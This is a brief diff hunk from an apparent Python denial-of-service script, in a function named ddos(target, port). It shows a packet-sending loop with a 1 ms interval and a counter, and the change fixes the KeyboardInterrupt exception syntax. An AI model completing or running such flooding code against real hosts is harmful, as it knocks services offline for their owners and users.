@@ -19,7 +19,7 @@ def ddos(target, port):
                 send(pkt,inter= .001)
                 print(f"Packet(s) sent [{i}]" , end = "\r")
                 i=i+1
-        except KeyboardInterrupt():
+        except KeyboardInterrupt:
             sys.exit('\n')
         except:
             e = sys.exc_info()[1]
